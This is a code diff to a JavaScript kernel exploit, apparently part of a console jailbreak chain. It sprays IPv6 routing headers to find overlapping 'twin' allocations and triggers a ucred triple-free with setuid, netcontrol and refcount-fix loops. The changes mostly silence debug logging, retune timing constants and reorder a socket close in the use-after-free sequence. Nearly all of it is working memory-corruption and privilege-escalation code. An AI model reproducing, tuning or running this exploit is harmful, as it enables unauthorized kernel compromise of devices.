@@ -292,9 +292,9 @@ function set_rthdr(sd, buf, len) {
 var real_get_rthdr = get_rthdr;
 
 get_rthdr = function(sock, buf, len) {
-  log("[RTHDR-GET] BEFORE sock=" + sock + " max_len=" + len);
+  //log("[RTHDR-GET] BEFORE sock=" + sock + " max_len=" + len);
   var ret = real_get_rthdr(sock, buf, len);
-  log("[RTHDR-GET] AFTER ret=" + ret);
+  //log("[RTHDR-GET] AFTER ret=" + ret);
   return ret;
 };
 function get_rthdr(sd, buf, max_len) {
@@ -306,13 +306,13 @@ function get_rthdr(sd, buf, max_len) {
 function free_rthdrs(sds) {
   for (var sd of sds) {
     if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
-      log("[RTHDR-FREE-ALL] sd=" + sd);
+      //log("[RTHDR-FREE-ALL] sd=" + sd);
       set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
     }
   }
 }
 function free_rthdr(sd) {
-  log("[RTHDR-FREE] sd=" + sd);
+  //log("[RTHDR-FREE] sd=" + sd);
   set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0);
 }
 function pin_to_core(core) {
@@ -819,20 +819,18 @@ function cleanup() {
 }
 function fill_buffer_64(buf, val, len) {
   if (!buf || buf.eq(0) || len <= 0) {
-    log("[BUF-FILL] SKIP buf=" + buf + " len=" + len);
+    //log("[BUF-FILL] SKIP buf=" + buf + " len=" + len);
     return;
   }
 
-  log("[BUF-FILL] START buf=" + buf +
-      " len=" + len +
-      " val=" + val);
+  //log("[BUF-FILL] START buf=" + buf + " len=" + len + " val=" + val);
 
   for (var i = 0; i < len; i += 8) {
     write64(buf.add(i), val);
   }
 
-  log("[BUF-FILL] END wrote=" + len + " bytes");
-  log("[BUF-FILL] wrote @ offset " + i);
+  //log("[BUF-FILL] END wrote=" + len + " bytes");
+  //log("[BUF-FILL] wrote @ offset " + i);
 
 }
 var real_find_twins = find_twins;
@@ -874,7 +872,7 @@ function find_twins() {
 
   while (count < MAX_ROUNDS_TWIN) {
 
-    log("\n[TWINS-ROUND] #" + count + "\n");
+    //log("\n[TWINS-ROUND] #" + count + "\n");
 
     // memory pressure check (soft)
     if (typeof debugging !== 'undefined' &&
@@ -900,8 +898,7 @@ function find_twins() {
       var tag = RTHDR_TAG | i;
 
       // لوج قديم لو حابب تسيبه أو تقلله
-      log("[WRITE] sock=" + i +
-          " tag=" + hex(tag));
+     // log("[WRITE] sock=" + i + " tag=" + hex(tag));
 
       // كتابة التاج في البافر المشترك
       write32(spray_add, tag);
@@ -910,9 +907,7 @@ function find_twins() {
       // 🔥 اللوج الجديد + استدعاء set_rthdr الحقيقي
       var spray_ptr = spray_rthdr_rop.add(i * UCRED_SIZE);
 
-      log("[WRITE] sock=" + i +
-          " spray_ptr=" + hex(spray_ptr) +
-          " len=" + spray_rthdr_len);
+      //log("[WRITE] sock=" + i + " spray_ptr=" + hex(spray_ptr) + " len=" + spray_rthdr_len);
 
       set_rthdr(
         ipv6_socks[i],
@@ -937,15 +932,13 @@ function find_twins() {
       for (var k = 0; k < 0x20; k += 4) {
         dump += hex(read32(leak_rthdr.add(k))) + " ";
       }
-      log("[DUMP] sock=" + i + " → " + dump);
+      //log("[DUMP] sock=" + i + " → " + dump);
 
       // تحليل التاج
       val = read32(leak_add);
       j = val & 0xFFFF;
 
-      log("[PARSE] raw_val=" + hex(val) +
-          " tag=" + hex(val & 0xFFFF0000) +
-          " idx=" + j);
+      //log("[PARSE] raw_val=" + hex(val) + " tag=" + hex(val & 0xFFFF0000) + " idx=" + j);
 
       var condition =
         ((val & 0xFFFF0000) === RTHDR_TAG) &&
@@ -953,7 +946,7 @@ function find_twins() {
         (j >= 0) &&
         (j < ipv6_socks.length);
 
-      log("[CHECK] i=" + i + " j=" + j + " cond=" + condition);
+      //log("[CHECK] i=" + i + " j=" + j + " cond=" + condition);
 
       if (condition) {
         log("\n🔥🔥🔥 [TWINS-FOUND] i=" + i + " j=" + j + " 🔥🔥🔥\n");
@@ -1029,7 +1022,7 @@ function setup_log_screen() {
     jsmaf.root.children.push(line);
     logLines.push(line);
   }
-  _log = function (msg, screen) {
+  log = function (msg, screen) {
     if (screen) {
       logBuf.push(msg);
       if (logBuf.length > LOG_MAX_LINES) {
@@ -1422,8 +1415,8 @@ function remove_uaf_file() {
     }
   }
 }
-var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 48;
-var TRIPLEFREE_REFCOUNT_MAX_WAIT = 6000;
+var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 32;
+var TRIPLEFREE_REFCOUNT_MAX_WAIT = 4000;
 
 function trigger_ucred_triplefree() {
   var end = false;
@@ -1450,9 +1443,6 @@ function trigger_ucred_triplefree() {
     setuid(1);
     log("[+] setuid(1) → new ucred allocated");
 
-    // close dummy socket
-    close(new BigInt(dummy_socket));
-    log("[+] dummy_socket closed → FD freed");
 
     // 3) reclaim fd → uaf_socket
     uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
@@ -1464,6 +1454,10 @@ function trigger_ucred_triplefree() {
 
     netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
     log("[+] netcontrol CLEAR_QUEUE sent");
+
+    // close dummy socket
+    close(new BigInt(dummy_socket));
+    log("[+] dummy_socket closed → FD freed");
 
     // 6) refcount fix loop
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
